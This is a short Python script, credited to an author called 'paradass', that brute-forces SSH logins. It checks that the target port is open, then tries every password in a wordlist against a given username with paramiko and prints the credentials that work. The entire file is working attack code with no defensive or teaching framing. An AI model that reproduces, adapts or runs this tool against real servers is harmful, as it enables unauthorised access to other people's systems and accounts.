#Basic shh cracker with python by Burak "paradass" Görez

import socket
import paramiko
import argparse

class Cracker:
    def crack(self):
        parser = argparse.ArgumentParser(description="Paramiko ssh cracker by paradass",add_help=False)
        parser.add_argument("-t","--target",required=True,type=str)
        parser.add_argument("-u","--username",required=True,type=str)
        parser.add_argument("-p","--port",required=False,default="22",type=int)
        parser.add_argument("-w","--wordlist",required=False,default="wordlist.txt",type=str)
        args = parser.parse_args()

        client_socket =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        result = client_socket.connect_ex((args.target,args.port))
        if result == 0:
            print("\033[1mCracking..\033[0m")
        else:
            print(f"\033[31mPort {args.port} not open!\033[0m")
            return

        with open(args.wordlist,"r") as file:
            lines = file.readlines()
            try:
                for line in lines:
                    line = line.strip()
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    try:
                        client.connect(args.target,args.port,args.username,line)
                        print(f"\033[32m{args.target}:{args.port} for username:\033[34m{args.username}\033[32m and password:\033[34m{line}\033[0m")
                        break
                    except paramiko.AuthenticationException as e:
                        print(f"\033[31m{args.username}:{line} {e}\033[0m")
                    except Exception as e:
                        print(f"\033[31m{e}\033[0m")
                        break
            except KeyboardInterrupt:
                print(f"\033[35mStopping for keyboard interrupt\033[0m")
            except Exception as e:
                print(e)

cracker = Cracker()
cracker.crack()